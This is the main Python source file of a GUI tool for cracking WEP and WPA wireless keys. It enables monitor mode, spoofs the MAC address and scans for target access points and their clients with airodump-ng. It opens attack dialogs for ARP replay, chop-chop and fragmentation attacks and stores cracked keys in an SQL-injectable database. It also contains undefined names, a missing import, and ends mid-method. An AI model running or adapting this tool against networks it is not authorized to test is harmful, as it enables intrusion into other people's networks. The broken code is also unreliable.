#!/usr/bin/env python

import os
import sys
import time
import thread
import urllib2
import sqlite3
import subprocess
from PyQt4 import QtGui,QtCore
from main_window import *
from tips import *
from toolbox import *
from settings import *
from wep_attack import *
from wpa_attack import *
from font_settings import *
from ivs_settings import *
from database import *

__version__= 1.43

#
# Network scan global variable
#
scan_control = 0
#
# Update checking loop (control variable)
#
updater_control = 0
#
# Wep Global variables
#
victim_mac = ''
victim_channel = ''
victim_access_point = ''
ivs_number = 0
WEP = ''
digit = 0
ivs_new = ivs_number + digit
#
# Wpa Global variables
#
client_list = []
wpa_victim_mac_address = ''
wpa_victim_channel = ''
wpa_victim_access = ''
control = 0
current_word = ''
#
# Creating /tmp/ directory for logging of wireless information
#

direc = '/tmp/'
log_direc = 'fern-log'
tmp_direc = os.listdir(direc)                                    # list/tmp/
directory = os.getcwd()

#
# Create temporary log directory
#
if 'fern-log' in tmp_direc:
    commands.getstatusoutput('rm -r %s'%(direc + log_direc))    # Delete directory in /fern-log if it already exists in /tmp/
    os.mkdir(direc + log_direc)
else:
    os.mkdir(direc + log_direc)                                 # Create /tmp/fern-log/

#
# Create Sub Temporary directory in /tmp/fern-log
#
os.mkdir('/tmp/fern-log/WPA')                                     # Create /tmp/fern-log/WPA


#
# Create permanent settings directory
#
if 'fern-settings' not in os.listdir(os.getcwd()):
    os.mkdir('fern-settings')                                   # Create permanent settings directory

#
# Create database if it does not exist
#
def database_create():
        temp = sqlite3.connect('key-database/Database.db')                 # Database File and Tables are created Here
        temp_query = temp.cursor()
        temp_query.execute('''create table if not exists keys \
                            (access_point text,encryption text,key text,channel int)''')
        temp.commit()
        temp.close()

if 'key-database' not in os.listdir(os.getcwd()):
    os.mkdir('key-database')
    if 'Database.db' not in os.listdir('key-database'):
        database_create()                                   # Database File and Tables are created Here
    else:
        database_create()
else:
    database_create()
#
#   Read database entries and count entries then set Label on main window
#
def update_database_label():
    connection = sqlite3.connect('key-database/Database.db')
    query = connection.cursor()
    query.execute('''select * from keys''')
    items = str(query.fetchall())
    connection.close()
    wep_entries = items.count('WEP')
    wpa_entries = items.count('WPA')
    if int(wep_entries + wpa_entries) <= 0:
        entries_label.setText('<font color=red>No Key Entries</font>')
    else:
        entries_label.setText('<font color=red>%s Key Entries</font>'%(str(wep_entries + wpa_entries)))

#
# Add keys to Database with this function
#
def set_key_entries(arg,arg1,arg2,arg3):
    connection = sqlite3.connect('key-database/Database.db')
    query = connection.cursor()
    query.execute("insert into keys values ('%s','%s','%s','%s')"%(str(arg),str(arg1),str(arg2),str(arg3)))
    connection.commit()
    connection.close()

#
# Some globally defined functions for write and read tasks
#
def reader(arg):
    open_ = open(arg,'r+')
    read_file = open_.read()
    return read_file

def write(arg,arg2):
    open_ = open(arg,'a+')
    open_.write(arg2)
    open_.close()

def remove(arg,arg2):
    commands.getstatusoutput('rm -r %s/%s'%(arg,arg2))  #'rm - r /tmp/fern-log/file.log


def client_update():
    global wpa_clients_list                             # Exclusively for WPA getting
    wpa_clients_str = reader('/tmp/fern-log/WPA/zfern-wpa-01.csv')
    wpa_clients_sort = wpa_clients_str[wpa_clients_str.index('Probed ESSIDs'):-1]
    wpa_clients_sort1 = wpa_clients_sort.replace(',','\n')
    wpa_clients_sort2 = wpa_clients_sort.replace(' ','')
    wpa_clients_sort3 = wpa_clients_sort2.replace(',','\n')
    wpa_clients_list = wpa_clients_sort3.splitlines()

    mac_address = str(wpa_victim_mac_address.strip(' '))

    for iterate in range(0,wpa_clients_sort.count('\n')-1):
        try:
            client1 = wpa_clients_list.index(mac_address) - 5
            client1_calc = wpa_clients_list[client1]
            if client1_calc == ' ' or '':pass
            else:
                if client1_calc in client_list:
                    pass
                else:
                    client_list.append(client1_calc)
                    wpa_clients_list.pop(wpa_clients_list.index(mac_address))
        except(IndexError,ValueError):
            pass

#
# Main Window Class
#
class mainwindow(QtGui.QDialog,Ui_Dialog):
    def __init__(self):
        QtGui.QDialog.__init__(self)
        self.setupUi(self)
        self.retranslateUi(self)
        self.refresh_interface()

        self.connect(self.label_3,QtCore.SIGNAL("DoubleClicked()"),self.mouseDoubleClickEvent)
        self.connect(self.refresh_intfacebutton,QtCore.SIGNAL("clicked()"),self.refresh_interface)
        self.connect(self.interface_combo,QtCore.SIGNAL("currentIndexChanged(QString)"),self.setmonitor)
        self.connect(self.scan_button,QtCore.SIGNAL("clicked()"),self.scan_network)
        self.connect(self.wep_button,QtCore.SIGNAL("clicked()"),self.wep_attack_window)
        self.connect(self.wpa_button,QtCore.SIGNAL("clicked()"),self.wpa_attack_window)
        self.connect(self.tool_button,QtCore.SIGNAL("clicked()"),self.tool_box_window)
        self.connect(self.database_button,QtCore.SIGNAL("clicked()"),self.database_window)
        self.connect(self.update_button,QtCore.SIGNAL("clicked()"),self.update_fern)
        self.connect(self,QtCore.SIGNAL("finished downloading"),self.finished_downloading_files)
        self.connect(self,QtCore.SIGNAL("restart application"),self.restart_application)
        self.connect(self,QtCore.SIGNAL("failed update"),self.update_fail)
        self.connect(self,QtCore.SIGNAL("already latest update"),self.latest_update)
        self.connect(self,QtCore.SIGNAL("previous message"),self.latest_svn)
        self.connect(self,QtCore.SIGNAL("new update available"),self.new_update_avialable)
        self.connect(self,QtCore.SIGNAL("current_version"),self.current_update)
        self.connect(self,QtCore.SIGNAL("download failed"),self.download_failed)
        self.connect(self,QtCore.SIGNAL('internal scan error'),self.scan_error_display)
        self.connect(self,QtCore.SIGNAL('file downloaded'),self.downloading_update_files)



        self.update_label.setText('<font color=green>Currently installed version: Revision %s</font>'%(self.installed_revision()))

        # Display update status on main_windows
        thread.start_new_thread(self.update_initializtion_check,())

        global scan_label
        scan_label = self.label_7

        global entries_label
        entries_label = self.label_16

        update_database_label()

    #
    # SIGNALs for update threads
    #
    def update_fail(self):
        self.update_label.setText('<font color=red>Unable to check for updates,network timeout')

    def download_failed(self):
        self.update_label.setText('<font color=red>Download failed,network timeout')

    def downloading_update_files(self):
        global file_total
        global files_downloaded

        self.update_label.setText('<font color=green>Downloading.. %s Complete</font>'\
        %(self.percentage(files_downloaded,file_total)))

    def installed_revision(self):
        svn_info = commands.getstatusoutput('svn info ' + directory)
        if svn_info[0] == 0:
            svn_version = svn_info[1].splitlines()[4].strip('Revision: ')
        else:
            svn_version = '94'
        return svn_version

    def finished_downloading_files(self):
        self.update_label.setText('<font color=green>Finished Downloading</font>')

    def restart_application(self):
        self.update_label.setText('<font color=red>Please Restart application</font>')

    def latest_update(self):
        self.update_label.setText('<font color=green>No new update is available for download</font>')

    def current_update(self):
        self.update_label.setText('<font color=green>Currently installed version: Revision %s</font>'%(self.installed_revision()))


    def latest_svn(self):
        self.update_label.setText('<font color=green>Latest update is already installed: Revision %s</font>'%(self.installed_revision()))

    def new_update_avialable(self):
        self.update_label.setText('<font color=green>New Update is Available</font>')
        self.update_button.setFocus()

    def update_error(self):
        global svn_access
        global svn_failure_message
        svn_failure_message = str()
        svn_failure = svn_access.stderr
        svn_failure_message = svn_failure.read()


    #
    # Update Fern application via SVN,updates at ("svn checkout http://fern-wifi-cracker.googlecode.com/svn/Fern-Wifi-Cracker/")
    #
    def update_fern(self):
        global updater_control
        updater_control = 1
        self.update_label.setText('<font color=green>Checking for update...</font>')
        thread.start_new_thread(self.update_launcher,())


    def percentage(self,current,total):
        float_point = float(current)/float(total)
        calculation = int(float_point * 100)
        percent = str(calculation) + '%'
        return percent


    def update_launcher(self):
        ''' Downloads and installs update files
        '''
        global svn_access
        global file_total
        global files_downloaded
        global fern_directory

        files_downloaded = int()
        file_total = int()

        fern_directory = os.getcwd()
        svn_path = 'http://fern-wifi-cracker.googlecode.com/svn/Fern-Wifi-Cracker/'

        try:
            online_response_check = urllib2.urlopen('http://fern-wifi-cracker.googlecode.com/files/update_control')
            online_response = online_response_check.read()

            for search in online_response.splitlines():
                if 'total_files' in search:
                    file_total = int(search.split()[2])

            if 'Fern-Wifi-Cracker' in os.listdir('/tmp/'):
                commands.getstatusoutput('rm -r /tmp/Fern-Wifi-Cracker')

            svn_access = subprocess.Popen('cd /tmp/ \n svn checkout http://fern-wifi-cracker.googlecode.com/svn/Fern-Wifi-Cracker/',\
                    shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            svn_update = svn_access.stdout
            thread.start_new_thread(self.update_error,())
            while True:
                response = svn_update.readline()
                if len(response) > 0:
                    files_downloaded += 1
                    self.emit(QtCore.SIGNAL('file downloaded'))
                else:
                    time.sleep(4)
                    update_failures += 1

                if str('revision') in str(response):
                    self.emit(QtCore.SIGNAL("finished downloading"))
                    commands.getstatusoutput('rm -r *.py *.pyc resources .svn')
                    commands.getstatusoutput('cp -r /tmp/Fern-Wifi-Cracker/* '+ os.getcwd())
                    time.sleep(5)
                    self.emit(QtCore.SIGNAL("restart application"))
                    break
                if len(svn_failure_message) > 2:
                    self.emit(QtCore.SIGNAL("download failed"))
                    break

        except(urllib2.URLError,urllib2.HTTPError):
            self.emit(QtCore.SIGNAL("download failed"))


    #
    # Update checker Thread
    #
    def update_initializtion_check(self):
        global updater_control
        updater_control = 0
        while updater_control != 1:
            try:
                online_response_thread = urllib2.urlopen('http://fern-wifi-cracker.googlecode.com/files/update_control')
                online_response_string = ''
                online_response = online_response_thread.read()
                for version_iterate in online_response.splitlines():
                    if 'version' in str(version_iterate):
                        online_response_string += version_iterate
                    else:pass

                update_version_number = float(online_response_string.split()[2])

                if float(__version__) != update_version_number:
                    self.emit(QtCore.SIGNAL("new update available"))
                    break
                elif float(__version__) == update_version_number:
                    self.emit(QtCore.SIGNAL("already latest update"))
                    time.sleep(20)
                    self.emit(QtCore.SIGNAL("previous message"))
                    break
                else:
                    pass
            except Exception:
                self.emit(QtCore.SIGNAL("failed update"))
                time.sleep(9)

    #
    # Launches Tool Box window
    #
    def tool_box_window(self):
        tool_box = tool_box_window()
        tool_box.exec_()
    #
    # Execute the wep attack window
    #
    def wep_attack_window(self):
        if 'WEP-DUMP' not in os.listdir('/tmp/fern-log'):
            os.mkdir('/tmp/fern-log/WEP-DUMP')
        else:
            commands.getstatusoutput('rm -r /tmp/fern-log/WEP-DUMP/*')

        wep_run = wep_attack_dialog()
        wep_run.exec_()

    #
    # Execute the wep attack window
    #
    def wpa_attack_window(self):
        commands.getstatusoutput('killall aircrack-ng')
        if 'WPA-DUMP' not in os.listdir('/tmp/fern-log'):
            os.mkdir('/tmp/fern-log/WPA-DUMP')
        else:
            commands.getstatusoutput('rm -r /tmp/fern-log/WPA-DUMP/*')

        wpa_run = wpa_attack_dialog()
        wpa_run.exec_()
    #
    # Execute database Window
    #
    def database_window(self):
        database_run = database_dialog()
        database_run.exec_()
    #
    # Refresh wireless network interface card and update combobo
    #
    def refresh_interface(self):
        commands.getstatusoutput('killall airodump-ng')
        commands.getstatusoutput('killall airmon-ng')
        try:
            self.mon_label.setText(" ")
	    self.interface_combo.clear()
            del list_
        except NameError:
            pass

        # Disable cards already on monitor modes
        wireless_interfaces = str(commands.getstatusoutput('airmon-ng'))
        prev_monitor = os.listdir('/sys/class/net')
        monitor_interfaces_list = []
        for monitors in prev_monitor:
            if monitors in wireless_interfaces:
                monitor_interfaces_list.append(monitors)
        for monitored_interfaces in monitor_interfaces_list:
            commands.getstatusoutput('airmon-ng stop %s'%(monitored_interfaces))

        # List Interface cards
        compatible_interface = str(commands.getoutput("airmon-ng | egrep -e '^[a-z]{2,4}[0-9]'"))
        interface_list = os.listdir('/sys/class/net')
        list_ = ['Select Interface']
        # Interate over interface output and update combo box
        if compatible_interface.count('\t') == 0:
            self.interface_combo.addItems(list_)
            self.mon_label.setText("<font color=red>No Wireless Interface was found</font>")
        else:
            for interface in interface_list:
                if interface in compatible_interface:
                    if interface.startswith('mon'):
                        pass
                    else:
                        list_.append(interface)

            self.interface_combo.addItems(list_)
            self.mon_label.setText("<font color=red>Select an interface card</font>")



    #
    # Set monitor mode on selected monitor from combo list
    #
    def setmonitor(self):
        monitor_card = str(self.interface_combo.currentText())
	if monitor_card != 'Select Interface':
            status = str(commands.getoutput("airmon-ng start %s"%(monitor_card)))
            if 'monitor mode enabled' in status:
                monitor_interface_process = str(commands.getoutput("airmon-ng | egrep -e '^[a-z]{2,4}[0-9]'"))
                monitor_interface = monitor_interface_process.splitlines()
                mon_int1 = monitor_interface[-1]
                mon_real = mon_int1[0:6].strip('\t\t')
                remove('/tmp/fern-log','monitor.log')
                write('/tmp/fern-log/monitor.log',mon_real)     # write monitoring interface like(mon0,mon1)to log
                self.mon_label.setText("<font color=green>Monitor Mode Enabled on %s</font>"%(mon_real))

                #
                # Create Fake Mac Address and index for use
                #
                mon_down = commands.getstatusoutput('ifconfig %s down'%(mon_real))
                set_fake_mac = commands.getstatusoutput('macchanger -A %s'%(mon_real))
                mon_up = commands.getstatusoutput('ifconfig %s up'%(mon_real))
                for iterate in os.listdir('/sys/class/net'):
                    if str(iterate) == str(mon_real):
                        os.chmod('/sys/class/net/' + mon_real + '/address',0777)
                        mac_address = reader('/sys/class/net/' + mon_real + '/address')


                if 'monitor-mac-address.log' in os.listdir('/tmp/fern-log'):
                    remove('/tmp/fern-log','monitor-mac-address.log')
                    write('/tmp/fern-log/monitor-mac-address.log',mac_address)
                else:
                    write('/tmp/fern-log/monitor-mac-address.log',mac_address)


                #
                # Execute tips
                #
                if 'tips-settings.dat' in os.listdir('fern-settings'):
                    if reader('fern-settings/tips-settings.dat') == '1':
                        pass
                    else:
                        tips = tips_window()
                        tips.exec_()
                else:
                    write('fern-settings/tips-settings.dat','')
                    tips = tips_window()
                    tips.exec_()
            else:
                self.mon_label.setText("<font color=red>Monitor Mode not enabled check manually</font>")
	else:pass

    #
    # Double click event for poping of settings dialog box
    #
    def mouseDoubleClickEvent(self, event):
        try:
            setting = settings_dialog()
            setting.exec_()
        except IOError:
            self.mon_label.setText("<font color=red>Enable monitor mode to access settings</font>")


    def scan_error_display(self):
        global error_catch
        self.stop_scan_network()
        QtGui.QMessageBox.warning(self,'Scan Error','Fern failed to start scan due to an airodump-ng error: <font color=red>' \
                                        + error_catch[1] + '</font>')



    #
    # Scan for available networks
    #
    def scan_network(self):
        global scan_control
        scan_control = 0
        if 'monitor.log' not in os.listdir('/tmp/fern-log'):
            self.mon_label.setText("<font color=red>Enable monitor mode before scanning</font>")
        else:
            self.connect(run,QtCore.SIGNAL("wep_number_changed"),self.wep_number_changed)
            self.connect(run,QtCore.SIGNAL("wep_button_true"),self.wep_button_true)
            self.connect(run,QtCore.SIGNAL("wep_button_false"),self.wep_button_false)

            self.connect(run,QtCore.SIGNAL("wpa_number_changed"),self.wpa_number_changed)
            self.connect(run,QtCore.SIGNAL("wpa_button_true"),self.wpa_button_true)
            self.connect(run,QtCore.SIGNAL("wpa_button_false"),self.wpa_button_false)
            self.wpa_button.setEnabled(False)
            self.wep_button.setEnabled(False)
            self.wep_clientlabel.setText("Access Points ")
            self.wpa_clientlabel.setText("Access Points ")
            self.label_7.setText("Points<font Color=green>\t Initializing</font>")
            thread.start_new_thread(self.scan_wep,())
            self.disconnect(self.scan_button,QtCore.SIGNAL("clicked()"),self.scan_network)
            self.connect(self.scan_button,QtCore.SIGNAL("clicked()"),self.stop_scan_network)


    def stop_scan_network(self):
        global error_catch
        global scan_control
        scan_control = 1
        commands.getstatusoutput('rm -r /tmp/fern-log/*.cap')
        commands.getstatusoutput('killall airodump-ng')
        commands.getstatusoutput('killall airmon-ng')
        self.label_7.setText("Points<font Color=red>\t Stopped</font>")
        self.wep_clientlabel.setText("Access Points ")
        self.wpa_clientlabel.setText("Access Points ")
        self.disconnect(self.scan_button,QtCore.SIGNAL("clicked()"),self.stop_scan_network)
        self.connect(self.scan_button,QtCore.SIGNAL("clicked()"),self.scan_network)

    #
    # WEP Thread SLOTS AND SIGNALS
    #
    def wep_number_changed(self):
        number_access = reader('/tmp/fern-log/number.log')
        self.wep_clientlabel.setText('<font color=red>%s</font><font color=red>\t Detected</font>'%(number_access))

    def wep_button_true(self):
        self.wep_button.setEnabled(True)

    def wep_button_false(self):
        self.wep_button.setEnabled(False)
        self.wep_clientlabel.setText('Access Points')
    #
    # WPA Thread SLOTS AND SIGNALS
    #
    def wpa_number_changed(self):
        number_access = reader('/tmp/fern-log/WPA/number.log')
        self.wpa_clientlabel.setText('<font color=red>%s</font><font color=red>\t Detected</font>'%(number_access))

    def wpa_button_true(self):
        self.wpa_button.setEnabled(True)

    def wpa_button_false(self):
        self.wpa_button.setEnabled(False)
        self.wpa_clientlabel.setText('Access Points')

    #
    # WEP SCAN THREADING FOR AUTOMATIC SCAN OF NETWORK
    #
    ###################
    def scan_process1_thread(self):
        global error_catch
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        error_catch = commands.getstatusoutput("airodump-ng --write /tmp/fern-log/zfern-wep --output-format csv \
                                    --encrypt wep %s"%(monitor))          #FOR WEP
        if error_catch[0] != 0:
            self.emit(QtCore.SIGNAL('internal scan error'))


    def scan_process1_thread1(self):
        global error_catch
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        error_catch = commands.getstatusoutput("airodump-ng --write /tmp/fern-log/WPA/zfern-wpa --output-format csv \
                                    --encrypt wpa %s"%(monitor))      # FOR WPA
        if error_catch[0] != 0:
            self.emit(QtCore.SIGNAL('internal scan error'))


    ###################
    def scan_process2_thread(self):
        global error_catch
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        if 'static-channel.log' in os.listdir('/tmp/fern-log'):
            channel = str(reader('/tmp/fern-log/static-channel.log'))
        else:
            channel = ''

        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
            xterm = 'xterm -e'
        else:
            xterm = ''
        error_catch = commands.getstatusoutput("%s 'airodump-ng --write /tmp/fern-log/zfern-wep --output-format csv\
                                        --encrypt wep %s'"%(xterm,monitor))      #FOR WEP
        if error_catch[0] != 0:
            self.emit(QtCore.SIGNAL('internal scan error'))


    def scan_process2_thread1(self):
        global error_catch
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        if 'static-channel.log' in os.listdir('/tmp/fern-log'):
            channel = str(reader('/tmp/fern-log/static-channel.log'))
        else:
            channel = ''

        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
            xterm = 'xterm -e'
        else:
            xterm = ''
        error_catch = commands.getstatusoutput("%s 'airodump-ng --write /tmp/fern-log/WPA/zfern-wpa \
                                    --output-format csv  --encrypt wpa %s'"%(xterm,monitor))  # FOR WPA
        if error_catch[0] != 0:
            self.emit(QtCore.SIGNAL('internal scan error'))


    ###########################
    def scan_process3_thread(self):
        global error_catch
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        if 'static-channel.log' in os.listdir('/tmp/fern-log'):
            channel = str(reader('/tmp/fern-log/static-channel.log'))
        else:
            channel = ''

        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
            xterm = 'xterm -e'
        else:
            xterm = ''
        error_catch = commands.getstatusoutput("airodump-ng --channel %s --write /tmp/fern-log/zfern-wep \
                                    --output-format csv  --encrypt wep %s"%(channel,monitor))    #FOR WEP
        if error_catch[0] != 0:
            self.emit(QtCore.SIGNAL('internal scan error'))


    def scan_process3_thread1(self):
        global error_catch
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        if 'static-channel.log' in os.listdir('/tmp/fern-log'):
            channel = str(reader('/tmp/fern-log/static-channel.log'))
        else:
            channel = ''

        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
            xterm = 'xterm -e'
        else:
            xterm = ''
        error_catch = commands.getstatusoutput("airodump-ng --channel %s --write /tmp/fern-log/WPA/zfern-wpa \
                                --output-format csv  --encrypt wpa %s"%(channel,monitor))# FOR WPA
        if error_catch[0] != 0:
            self.emit(QtCore.SIGNAL('internal scan error'))

    #######################
    def scan_process4_thread(self):
        global error_catch
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        if 'static-channel.log' in os.listdir('/tmp/fern-log'):
            channel = str(reader('/tmp/fern-log/static-channel.log'))
        else:
            channel = ''

        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
            xterm = 'xterm -e'
        else:
            xterm = ''
        error_catch = commands.getstatusoutput("%s 'airodump-ng --channel %s --write /tmp/fern-log/zfern-wep \
                                    --output-format csv  --encrypt wep %s'"%(xterm,channel,monitor))# FOR WEP
        if error_catch[0] != 0:
            self.emit(QtCore.SIGNAL('internal scan error'))

    def scan_process4_thread1(self):
        global error_catch
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        if 'static-channel.log' in os.listdir('/tmp/fern-log'):
            channel = str(reader('/tmp/fern-log/static-channel.log'))
        else:
            channel = ''

        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
            xterm = 'xterm -e'
        else:
            xterm = ''
        error_catch = commands.getstatusoutput("%s 'airodump-ng --channel %s --write /tmp/fern-log/WPA/zfern-wpa \
                                    --output-format csv  --encrypt wpa %s'"%(xterm,channel,monitor))
        if error_catch[0] != 0:
            self.emit(QtCore.SIGNAL('internal scan error'))

    def scan_wep(self):
        global scan_control
        monitor = str(reader('/tmp/fern-log/monitor.log'))
        commands.getstatusoutput('rm -r /tmp/fern-log/*.csv')
        commands.getstatusoutput('rm -r /tmp/fern-log/*.cap')
        commands.getstatusoutput('rm -r /tmp/fern-log/WPA/*.csv')
        commands.getstatusoutput('rm -r /tmp/fern-log/WPA/*.cap')

        # Stactic channel settings consideration

        if 'static-channel.log' in os.listdir('/tmp/fern-log'):
            channel = str(reader('/tmp/fern-log/static-channel.log'))
        else:
            channel = ''

        # Xterm setting consideration

        if 'xterm-settings.log' in os.listdir('/tmp/fern-log'):
            xterm = 'xterm -e'
        else:
            xterm = ''

        # Channel desision block
        if scan_control == 0:
            if 'static-channel.log' not in os.listdir('/tmp/fern-log'):
                if 'xterm-settings.log' not in os.listdir('/tmp/fern-log'):
                    thread.start_new_thread(self.scan_process1_thread,())
                    thread.start_new_thread(self.scan_process1_thread1,())

                else:
                    thread.start_new_thread(self.scan_process2_thread,())
                    thread.start_new_thread(self.scan_process2_thread1,())
            else:
                if 'xterm-settings.log' not in os.listdir('/tmp/fern-log'):
                    thread.start_new_thread(self.scan_process3_thread,())
                    thread.start_new_thread(self.scan_process3_thread1,())
                else:
                    thread.start_new_thread(self.scan_process4_thread,())
                    thread.start_new_thread(self.scan_process4_thread1,())

        time.sleep(5)
        if scan_control != 1:
            self.label_7.setText("Points<font Color=green>\t Active</font>")

        commands.getstatusoutput('touch /tmp/fern-log/wep_details.log')
        commands.getstatusoutput('touch /tmp/fern-log/WPA/wpa_details.log')

        while scan_control != 1:
            try:
                time.sleep(2)

                wep_access_file = str(reader('/tmp/fern-log/zfern-wep-01.csv'))        # WEP access point log file
                wpa_access_file = str(reader('/tmp/fern-log/WPA/zfern-wpa-01.csv'))     # WPA access point log file

                number_access = str(wep_access_file.count('WEP')/2)        # number of access points wep detected
                try:
                    remove('/tmp/fern-log','number.log')
                except IOError:
                    pass
                write('/tmp/fern-log/number.log','%s'%(number_access))
                if int(number_access) > 0:
                    self.emit(QtCore.SIGNAL("wep_number_changed"))
                    self.emit(QtCore.SIGNAL("wep_button_true"))

                else:
                    self.emit(QtCore.SIGNAL("wep_button_false"))


                wep_access_convert = wep_access_file[0:wep_access_file.index('Station MAC')]
                wep_access_process = wep_access_convert[wep_access_convert.index('Key'):-1]
                wep_access_process1 = wep_access_process.strip('Key\r\n')
                process = wep_access_process1.splitlines()

                if reader('/tmp/fern-log/wep_details.log').count('\n') >= 50:
                    os.remove('/tmp/fern-log/wep_details.log')

                for iterate in range(0,int(number_access)):
                    detail_process1 = process[iterate]
                    detail_process2 = detail_process1.replace(',','\n')
                    wep_access = detail_process2.splitlines()
                    write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[0].strip(' ')))
                    write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[3].strip(' ')))
                    write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[4].strip(' ')))
                    write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[8].strip(' ')))
                    write('/tmp/fern-log/wep_details.log','%s \n'%(wep_access[13].strip(' ')))



                # WPA Access point sort starts here
                read_wpa = reader('/tmp/fern-log/WPA/zfern-wpa-01.csv')
                number_access_wpa = str(read_wpa.count('WPA'))        # number of access points wep detected
                try:
                    remove('/tmp/fern-log/WPA','number.log')
                except IOError:
                    pass
                write('/tmp/fern-log/WPA/number.log','%s'%(number_access_wpa))

                if int(number_access_wpa) == 0:
                    self.emit(QtCore.SIGNAL("wpa_button_false"))
                elif int(number_access_wpa) > 0:
                    self.emit(QtCore.SIGNAL("wpa_button_true"))
                    self.emit(QtCore.SIGNAL("wpa_number_changed"))
                else:
                    self.emit(QtCore.SIGNAL("wpa_button_false"))


                wpa_access_convert = wpa_access_file[0:wpa_access_file.index('Station MAC')]
                wpa_access_process = wpa_access_convert[wpa_access_convert.index('Key'):-1]
                wpa_access_process1 = wpa_access_process.strip('Key\r\n')
                process = wpa_access_process1.splitlines()

                if reader('/tmp/fern-log/WPA/wpa_details.log').count('\n') >= 50:
                    os.remove('/tmp/fern-log/WPA/wpa_details.log')

                for iterate in range(0,int(number_access_wpa)):
                    detail_process1 = process[iterate]
                    detail_process2 = detail_process1.replace(',','\n')
                    wpa_access = detail_process2.splitlines()
                    write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[0].strip(' ')))
                    write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[3].strip(' ')))
                    write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[4].strip(' ')))
                    write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[8].strip(' ')))
                    write('/tmp/fern-log/WPA/wpa_details.log','%s \n'%(wpa_access[13].strip(' ')))



            except(ValueError,IndexError):
                pass


            #
            # ABOVE IS FOR WPA
            #
#
# Wep Attack window class for decrypting wep keys
#
class wep_attack_dialog(QtGui.QDialog,wep_window):
    def __init__(self):
        QtGui.QDialog.__init__(self)
        self.setupUi(self)
        self.retranslateUi(self)

        self.connect(self.label_3,QtCore.SIGNAL("DoubleClicked()"),self.mouseDoubleClickEvent)
        self.connect(self.wep_access_point_combo,QtCore.SIGNAL("currentIndexChanged(QString)"),self.selected_wep_access)
        self.connect(self.wep_attack_button,QtCore.SIGNAL("clicked()"),self.wep_launch_attack)
        self.connect(self,QtCore.SIGNAL("injection_working"),self.injection_working)
        self.connect(self,QtCore.SIGNAL("injection_not_working"),self.injection_not_working)
        self.connect(self,QtCore.SIGNAL("associating"),self.associating)
        self.connect(self,QtCore.SIGNAL("update_progress_bar"),self.update_bar)
        self.connect(self,QtCore.SIGNAL("progress maximum"),self.progress_maximum)
        self.connect(self,QtCore.SIGNAL("injecting"),self.injecting)
        self.connect(self,QtCore.SIGNAL("gathering"),self.gathering)
        self.connect(self,QtCore.SIGNAL("chop-chop injecting"),self.chop_chop_attack)
        self.connect(self,QtCore.SIGNAL("fragment injecting"),self.fragmented_attack)
        self.connect(self,QtCore.SIGNAL("key not found yet"),self.key_not_found_yet)
        self.connect(self,QtCore.SIGNAL("wep found"),self.key_found)
        self.connect(self,QtCore.SIGNAL("cracking"),self.cracking)
        self.connect(self,QtCore.SIGNAL('passive mode'),self.passive_mode)
        self.connect(self,QtCore.SIGNAL('association failed'),self.association_failed)


        combo_temp = reader('/tmp/fern-log/wep_details.log')
        combo_list = combo_temp.splitlines()
        self.essid_label.setText('<font color=red>%s</font>'%(combo_list[4]))
        self.bssid_label.setText('<font color=red>%s</font>'%(combo_list[0]))
        self.channel_label.setText('<font color=red>%s</font>'%(combo_list[1].lower()))
        self.power_label.setText('<font color=red>%s</font>'%(combo_list[3].lower()))
        self.encrypt_wep_label.setText('<font color=red>WEP</font>')
        attack_type = ['Arp Request Replay','Chop-Chop Attack','Fragmentation Attack']
        list_ = []
        access_point_value = 4
        for iterate in range(0,combo_temp.count('\n')/5):
            if combo_list[access_point_value] not in list_:
                list_.append(combo_list[access_point_value])
                access_point_value += 5
            else:
                access_point_value += 5

        list_.sort()
        self.wep_access_point_combo.addItems(list_)
        self.attack_type_combo.addItems(attack_type)


    def selected_wep_access(self):
        global victim_mac
        global victim_channel
        global victim_access_point
        victim_access_point = self.wep_access_point_combo.currentText()
        access_points = reader('/tmp/fern-log/wep_details.log')
        access_points_list = access_points.splitlines()
        access_point = access_points_list.index(victim_access_point)
        victim_mac = access_points_list[access_point-4]
        victim_channel = access_points_list[access_point-3]
        victim_power = access_points_list[access_point-1]
        victim_speed = access_points_list[access_point-2]
        self.essid_label.setText('<font color=red>%s</font>'%(str(victim_access_point)))
        self.bssid_label.setText('<font color=red>%s</font>'%(str(victim_mac)))
        self.channel_label.setText('<font color=red>%s</font>'%(str(victim_channel)))
        self.power_label.setText('<font color=red>%s</font>'%(str(victim_power)))
        self.encrypt_wep_label.setText('<font color=red>WEP</font>')


    def mouseDoubleClickEvent(self,event):
        ivs = ivs_dialog()
        ivs.exec_()

    #
    # SIGNALS AND SLOTS FOR THE WEP CRACK STATUS
    #
    def stop_network_scan(self):
        global scan_control
        scan_control = 1
        commands.getstatusoutput('killall airodump-ng')
        commands.getstatusoutput('killall airmon-ng')
        self.label_7.setText("Points<font Color=red>\t Stopped</font>")

    def injection_working(self):
        self.injection_work_label.setEnabled(True)
        self.injection_work_label.setText('<font color=yellow> Injection is working on %s</font>'%(str(reader('/tmp/fern-log/monitor.log'))))

    def injection_not_working(self):
        self.injection_work_label.setEnabled(True)
        self.injection_work_label.setText('<font color=red> %s is not injecting or proximity is low </font>'%(str(reader('/tmp/fern-log/monitor.log'))))

    def associating(self):
        self.associate_label.setEnabled(True)
        self.associate_label.setText('<font color=yellow>Associating with Access Point</font>')

    def association_failed(self):
        self.associate_label.setEnabled(True)
